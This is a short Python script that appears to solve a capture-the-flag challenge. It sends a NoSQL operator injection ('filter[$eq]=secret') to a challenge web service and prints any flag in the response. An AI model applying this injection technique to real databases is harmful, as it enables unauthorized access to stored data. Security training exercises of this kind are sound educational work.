import requests

#link derivato da una noSQLinjection
url = 'http://bibbodb.challs.olicyber.it/type?filter[$eq]=secret'
r=requests.get(url).text

for i in r.split():
    if "flag{" in i.lower():
        print(i)